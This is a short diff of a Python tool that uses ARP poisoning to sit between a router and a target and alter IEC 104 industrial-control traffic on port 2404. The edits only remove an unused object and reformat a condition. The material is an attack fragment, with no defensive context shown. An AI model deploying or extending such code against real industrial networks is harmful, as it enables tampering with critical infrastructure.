@@ -8,8 +8,6 @@
 from ARP_poisoning import *
 from iec104lib import *
 
-instance = ARP_poisoning()
-
 ip_router = ARP_poisoning.router_ip
 ip_target = ARP_poisoning.target_ip
 ip_attack = ARP_poisoning.attack_ip
@@ -80,8 +78,7 @@ def is_packet_mesure_packet(packet):
 
 
 def mitm(chosen_packet):
-    if chosen_packet[Ether].src == mac_router and chosen_packet[IP].src == ip_router and chosen_packet[
-        IP].dst == ip_target:
+    if chosen_packet[Ether].src == mac_router and chosen_packet[IP].src == ip_router and chosen_packet[IP].dst == ip_target:
         modify_packet_for_target(chosen_packet)
         if chosen_packet[TCP].dport == '2404':
             new_packet = reconstructing_packet(chosen_packet)
